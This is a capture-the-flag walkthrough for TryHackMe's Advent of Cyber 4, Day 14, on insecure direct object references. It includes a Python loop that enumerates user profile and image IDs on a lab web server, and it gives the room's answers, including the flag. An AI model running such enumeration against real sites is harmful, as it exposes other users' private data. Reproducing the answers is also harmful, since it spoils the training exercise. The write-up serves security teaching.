# Advent of Cyber 4 - Day 14

Link: [Advent Of Cyber 4 on TryHackMe](https://tryhackme.com/room/adventofcyber4)

### Question 1

> What is the office number of Elf Pivot McRed?

We notice the parameter in the URL and automate a script to determine which ID's provide a result:

![](https://github.com/AtomicMaya/knowledge-base/blob/main/writeup_resources/aoc4/day14/1.1.png?raw=true)

The code is:

```sh
Python 3.6.9 (default, Jul 17 2020, 12:50:27) 
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import requests as r
>>> url = "http://10.10.85.26:8080/users/%s.html"
>>> url % 101
'http://10.10.85.26:8080/users/101.html'
>>> ok = []
>>> for i in range(200):
...     res = r.get(url % i)
...     if res.status_code == 200:
...             ok += [i]
...             print(f"Found page at ID {i}")
... 
Found page at ID 101
Found page at ID 102
Found page at ID 103
Found page at ID 104
Found page at ID 105
Found page at ID 106
Found page at ID 107
>>> ok
[101, 102, 103, 104, 105, 106, 107]
```

We then look at these ID's to find which one is Elf Pivot McRed:

![](https://github.com/AtomicMaya/knowledge-base/blob/main/writeup_resources/aoc4/day14/1.2.png?raw=true)

Answer: `134`

### Question 2

> Not only profile pages but also stored images are vulnerable. Start with a URL of a valid profile image; what is the hidden flag?

We see the images are at `../images/$ID.png`.

![](https://github.com/AtomicMaya/knowledge-base/blob/main/writeup_resources/aoc4/day14/2.1.png?raw=true)

We modify the code to:

```sh
Python 3.6.9 (default, Jul 17 2020, 12:50:27) 
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import requests as r
>>> url = "http://10.10.85.26:8080/users/../images/%s.png"
>>> url % 101
'http://10.10.85.26:8080/users/../images/101.png'
>>> ok = []
>>> for i in range(200):
...     res = r.get(url % i)
...     if res.status_code == 200:
...             ok += [i]
...             print(f"Found image at ID {i}")
... 
Found image at ID 100
Found image at ID 101
Found image at ID 102
Found image at ID 103
Found image at ID 104
Found image at ID 105
Found image at ID 106
Found image at ID 107
>>> ok
[100, 101, 102, 103, 104, 105, 106, 107]
```

We then look at the new ID to find which one is the flag:

![](https://github.com/AtomicMaya/knowledge-base/blob/main/writeup_resources/aoc4/day14/2.2.png?raw=true)

Answer: `THM{CLOSE_THE_DOOR}`

